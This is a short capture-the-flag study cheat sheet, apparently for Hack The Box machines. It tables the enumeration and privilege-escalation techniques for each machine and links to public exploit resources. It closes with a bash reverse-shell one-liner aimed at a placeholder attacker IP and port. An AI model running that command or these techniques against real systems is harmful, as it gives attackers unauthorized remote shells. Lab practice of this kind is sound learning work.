### Machines

| Machine | Enumeration | Privilege Escalation |
| ------------- | ------------- | ------------- |
| Forlic | playsms Ook! | BOF |
| Admirer | Adminer MySQL(local) | Hijacking Python Library | 
| Armageddon | Drupal (2018-7600) | binary snap |
| Backdoor | wordpress LFI proc gdbserver | screen |
| Blocky | dirb javadecompilers wordpress | sudo list |
| Blunder | feroxbuster Extensions [txt] bludit | sudo versions before 1.8.28 |
| Brainfuck | wordpress plugin smtp pop3 | Cryptography |
| Cronos | subdomain wfuzz| crontab |
| Doctor | [ssti-payloads](https://github.com/payloadbox/ssti-payloads) | Splunk |
| Forge | SSRF subdomain ftp | sudo list Python Debugger pdb |
| Haircut | dirb medium.txt writeable uploads folder | screen Unknown SUID binary |
| Horizontall | wfuzz top1million-110000 strapi | active port 8000 ```local CVE``` ssh tunnel |
| Irked | irc-unrealircd-backdoor | LinPEAS Unknown SUID binary |
| *Jarvis | SQLi phpmyadmin 4.8 RCE | python command injection & systemctl binary |
| Knife | firefox wappalyzer [PHP 8.1.0](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py)| upgrade shell & sudo list |
| Lame | distccd | nmap |
| Luanne | nmap Supervisor & robots.txt weather ||

### Additional Commands

Using in ```Knife``` for upgrade shell

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1'
```
